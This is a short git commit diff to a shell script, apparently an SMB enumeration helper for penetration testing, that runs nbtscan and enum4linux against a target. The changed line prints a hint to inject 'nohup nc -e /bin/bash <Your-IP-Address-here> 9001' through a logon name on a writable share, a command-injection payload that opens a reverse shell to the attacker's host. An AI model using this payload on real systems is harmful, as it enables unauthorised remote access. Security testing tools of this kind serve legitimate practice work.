a0b3bdb3d2c2e24e5e36701ea01555410c29f0d9
ss6851@rit.edu <ss6851@rit.edu>
2021-06-10 20:52:34 -0400

    nohup cmd change

--- initial.sh
+++ initial.sh
@@ -34,7 +34,7 @@ if [ "$#" = "1" ]; then
                         nbtscan $1 | tee smb_enum/nbtscan.txt 
 			printf "\n\n${Y}[+][+] enum4linux ${NC}\n\n"
 			enum4linux -a $1 | grep -P 'User\\' 
-			printf "\n\n${Y}[+][+] Try the following on a writable share: logon \"./='nohup nc -e /bin/bash $1 9001'\" ${NC}\n\n"
+			printf "\n\n${Y}[+][+] Try the following on a writable share: logon \"./='nohup nc -e /bin/bash <Your-IP-Address-here> 9001'\" ${NC}\n\n"
 			count=$((count+1))
 			fi
         fi
